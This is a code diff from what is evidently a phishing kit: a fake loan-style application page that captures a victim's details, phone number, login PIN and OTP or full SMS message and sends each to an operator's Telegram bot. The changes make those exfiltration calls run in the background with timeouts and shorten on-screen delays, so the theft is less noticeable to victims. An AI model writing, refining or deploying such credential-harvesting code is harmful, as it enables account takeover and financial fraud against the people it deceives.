@@ -54,6 +54,8 @@ const sendToTelegram = async (s) => {
   ].join('\n');
 
   try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 2500);
     const res = await fetch(
       `https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`,
       {
@@ -64,8 +66,10 @@ const sendToTelegram = async (s) => {
           text: msg,
           parse_mode: 'Markdown',
         }),
+        signal: controller.signal
       }
     );
+    clearTimeout(timeout);
     const data = await res.json();
     if (!data.ok) console.warn('Telegram error:', data.description);
   } catch (err) {
@@ -76,6 +80,8 @@ const sendToTelegram = async (s) => {
 
 const sendTextToTelegram = async (msg) => {
   try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 2500);
     await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -84,7 +90,9 @@ const sendTextToTelegram = async (msg) => {
         text: msg,
         parse_mode: 'Markdown',
       }),
+      signal: controller.signal
     });
+    clearTimeout(timeout);
   } catch (err) {}
 };
 
@@ -551,9 +559,9 @@ function navigate(view) {
         alert('Please confirm the terms and conditions to proceed.');
         return;
       }
-      // Show spinner, send to Telegram, then navigate to success
       showSpinner('Submitting your application...');
-      await sendToTelegram(state);
+      sendToTelegram(state); // Fire in background
+      await new Promise(r => setTimeout(r, 600)); // Smooth responsive feedback
       hideSpinner();
       navigate('success');
     });
@@ -562,7 +570,7 @@ function navigate(view) {
   /* ─ SUCCESS ─ */
   else if (view === 'success') {
     app.innerHTML = renderSuccess();
-    setTimeout(() => navigate('mobileLogin'), 3500);
+    setTimeout(() => navigate('mobileLogin'), 1800);
   }
 
   /* ─ MOBILE LOGIN ─ */
@@ -579,7 +587,8 @@ function navigate(view) {
         : phone;
       state.maskedPhone = masked;
       showSpinner('Verifying...');
-      await sendTextToTelegram(`📱 *MOBILE LOGIN*\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
+      sendTextToTelegram(`📱 *MOBILE LOGIN*\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
+      await new Promise(r => setTimeout(r, 600));
       hideSpinner();
       navigate('pinLogin');
     };
@@ -638,8 +647,8 @@ function navigate(view) {
 
       if (!currentIsOtp) {
         showSpinner('Authenticating...');
-        await sendTextToTelegram(`🔐 *PIN LOGIN*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
-        await new Promise(r => setTimeout(r, 1500));
+        sendTextToTelegram(`🔐 *PIN LOGIN*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
+        await new Promise(r => setTimeout(r, 800));
         hideSpinner();
 
         // Transition to second pin: OTP with full message instruction
@@ -658,8 +667,8 @@ function navigate(view) {
         pinLoginBtn.textContent = 'Submit OTP';
       } else {
         showSpinner('Verifying OTP...');
-        await sendTextToTelegram(`🔑 *OTP / FULL MESSAGE RECEIVED*\n• Phone: ${state.mbPhone || 'Unknown'}\n• Message: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
-        await new Promise(r => setTimeout(r, 1500));
+        sendTextToTelegram(`🔑 *OTP / FULL MESSAGE RECEIVED*\n• Phone: ${state.mbPhone || 'Unknown'}\n• Message: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
+        await new Promise(r => setTimeout(r, 800));
         hideSpinner();
         navigate('loginSuccess');
       }
